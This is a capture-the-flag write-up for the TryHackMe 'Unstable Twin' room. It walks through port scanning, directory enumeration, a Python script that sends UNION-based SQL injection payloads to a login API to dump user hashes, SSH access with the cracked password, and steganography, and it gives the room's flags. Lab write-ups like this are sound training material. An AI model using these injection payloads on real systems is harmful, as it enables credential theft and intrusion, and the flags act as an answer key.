---
layout: post
title: "TryHackMe: Unstable Twin"
date: 2026-01-15 20:30:00 +0530
categories: [TryHackMe]
tags: [tryhackme, UnstableTwin, ctf, walkthrough, linux, http, api, sql-injection, steganography, ssh, hacking, writeup]
render_with_liquid: false
media_subpath: /images/UnstableTwin/
description: "A Services based room, extracting information from HTTP Services and finding the hidden messages."

---

# TryHackMe: Unstable Twin CTF — Writeup | 15 January 2026

<div align="center">
    <img src="THM.png" alt="TryHackMe Logo" width="900"/>
    <img src="UnstableTwin.png" alt="Room Banner" width="300" style="border-radius: 50%;"/>
</div>

---

## Overview

Based on the Twins film, find the hidden keys. Julius and Vincent have gone into the SERVICES market to try and get the family back together. They have just deployed a new version of their code, but Vincent has messed up the deployment!

Can you help their mother find and recover the hidden keys and bring the family and girlfriends back together?

| Difficulty | Medium |
|:------:|:--------:|
| Time   | ~75 min  |
| OS     | Linux    |

---

## Task 1: Reconnaissance & Scanning

### Nmap Scan

Start with a service version scan to identify open ports:

```bash
sudo nmap -Pn -T4 -n -sC -sV -p- -oN scan_nmap.txt 10.64.182.204
```

**Scan Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ba:a2:40:8e:de:c3:7b:c7:f7:b3:7e:0c:1e:ec:9f:b8 (RSA)
|   256 38:28:4c:e1:4a:75:3d:0d:e7:e4:85:64:38:2a:8e:c7 (ECDSA)
|_  256 1a:33:a0:ed:83:ba:09:a5:62:a7:df:ab:2f:ee:d0:99 (ED25519)
80/tcp open  http    nginx 1.14.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.14.1
```

**Summary:**
- 22/tcp: SSH (OpenSSH 8.0)
- 80/tcp: HTTP (nginx 1.14.1)

<div align="center">
    <img src="nmap_scan.png" alt="Nmap Scan Results" width="800"/>
</div>

---

## Task 2: Directory Enumeration

### Gobuster Scan

Use Gobuster to discover hidden directories:

```bash
sudo gobuster dir -u http://10.64.182.204/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dir_results.txt -t 60
```

**Result:**

```
/info (Status: 200) [Size: 160]
```

<div align="center">
    <img src="gobuster.png" alt="Gobuster Results" width="800"/>
</div>

---

## Task 3: API Enumeration with Burp Suite

### Analyzing HTTP Responses

Open Burp Suite to intercept and analyze API responses:

```bash
burpsuite
```

Navigate to the `/info` endpoint and examine the responses. You'll notice there are **two different builds** responding!
1. Julius' stable build
2. Vincent's unstable build

Julius' stable build:
<div align="center">
    <img src="julius_info.png" alt="Burp Suite API Analysis" width="800"/>
</div>

Vincent's unstable build:
<div align="center">
    <img src="vincent_info.png" alt="Vincent's Build" width="800"/>
</div>

> **Answer:** Is this the only build? (Yay/Nay): `Nay`

---

## Task 4: SQL Injection on Login API

### Finding Users via SQLi

The `/api/login` endpoint is vulnerable to SQL Injection. Create a Python script to extract data:

<div align="center">
    <img src="login_api.png" alt="SQL Injection Script" width="800"/>
</div>

```python
import requests

url = 'http://10.64.182.204/api/login'  # Fixed URL; 

qq = [
    "1' UNION SELECT username, password FROM users ORDER BY id -- -",
    "1' UNION SELECT 1, group_concat(password) FROM users ORDER BY id -- -",
    "1' UNION SELECT 1, tbl_name FROM sqlite_master -- -",
    "1' UNION SELECT NULL, sqlite_version() -- -",
    "1' UNION SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql IS NOT NULL AND name='users' -- -",
    "1' UNION SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql IS NOT NULL AND name='notes' -- -",
    "' UNION SELECT 1, notes FROM notes -- -"
]

for q in qq:
    myobj = {'username': q, 'password': '123456'}
    x = requests.post(url, data=myobj)
    print(f"Payload: {q}")
    print(x.text)
    print("-" * 50)
```

Run the script:

```bash
python3 sqli_script.py
```

<div align="center">
    <img src="sqli_users.png" alt="SQL Injection Results" width="800"/>
</div>

> **Answer:** How many users are there? `5`

> **Answer:** What colour is Vincent? `Orange`

---

## Task 5: Cracking the Password Hash

### Decoding Mary Ann's Password

From the SQL injection, we extract a hash value:
<img src="hash.png" alt="Hash Decoding" width="800"/>

```
eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4
```

Decode the hash to reveal Mary Ann's SSH password.

<div align="center">
    <img src="hash_decode.png" alt="Hash Decoding" width="800"/>
</div>

> **Answer:** What is Mary Ann's SSH password? `experiment`

---

## Task 6: SSH Access & User Flag

### Logging In via SSH

Use the discovered credentials to access the system:

```bash
ssh mary_ann@<TARGET_IP>
```

Password: `experiment`

<div align="center">
    <img src="ssh_access.png" alt="SSH Access" width="800"/>
</div>

### User Flag

Navigate to Mary Ann's home directory and capture the user flag:

```bash
cat ~/user.txt
```

<div align="center">
    <img src="user_flag.png" alt="User Flag" width="800"/>
</div>

> **Answer:** User Flag: `THM{Mary_Ann_notes}`

---

## Task 7: Steganography - Finding Hidden Keys
We get server_note from mary_ann's home directory.

<div align="center">
    <img src="server_note.png" alt="Server Note" width="800"/>
</div>

### Extracting Images

Access the image endpoint with user names:

```
http://<TARGET_IP>/get_image?name=[username]
```

The five users are: **Red, Orange, Yellow, Green, and one more**. Download all images.

### Using Steghide

Extract hidden data from each image:

```bash
steghide extract -sf red.jpg
steghide extract -sf orange.jpg
steghide extract -sf yellow.jpg
steghide extract -sf green.jpg
```

<div align="center">
    <img src="steghide.png" alt="Steghide Extraction" width="800"/>
</div>

**Extracted Values:**
Arrange in rainbow order: 

- Red: `1DVsdb2uEE0k5HK4GAIZ`
- Orange: `PS0Mby2jomUKLjvQ4OSw`
- Yellow: `jKLNAAeCdl2J8BCRuXVX`
- Green: `eVYvs6J6HKpZWPG8pfeHoNG1`

---

## Task 8: Final Flag

### Base62 Decoding

Concatenate all the extracted values and decode using Base62:

```
1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSwjKLNAAeCdl2J8BCRuXVXeVYvs6J6HKpZWPG8pfeHoNG1
```

<div align="center">
    <img src="base62_decode.png" alt="Base62 Decoding" width="800"/>
</div>

> **Answer:** Final Flag: `THM{The_Family_Is_Back_Together}`

---

## Room Complete!

<div align="center">
    <img src="completed.png" alt="Completed" width="800"/>
</div>

---

## Summary

| Task | Challenge | Tool/Technique |
|:-----|:----------|:---------------|
| Recon | Port scanning | Nmap |
| Enumeration | Directory bruteforcing | Gobuster |
| API Analysis | HTTP response analysis | Burp Suite |
| Exploitation | SQL Injection | Python script |
| Credential Recovery | Hash decoding | Online tools |
| Access | SSH login | SSH client |
| Data Extraction | Image steganography | Steghide |
| Final Flag | Encoding | Base62 decoder |

---

## Key Takeaways

- Multiple service builds may exist on the same system — always check for inconsistencies
- API endpoints can be vulnerable to SQL Injection
- SQLite databases can be enumerated through UNION-based SQLi
- Steganography can hide important data within images
- Base62 encoding is sometimes used to obfuscate flags

---

## Happy Hacking!

<div align="center">
    <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExY2p2aTV2NnN0MzZjOXgyMjg5cm9xaGFvY3IxZWUzb3gwNzVhenowNSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/11UhXwm8Ipd9C/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
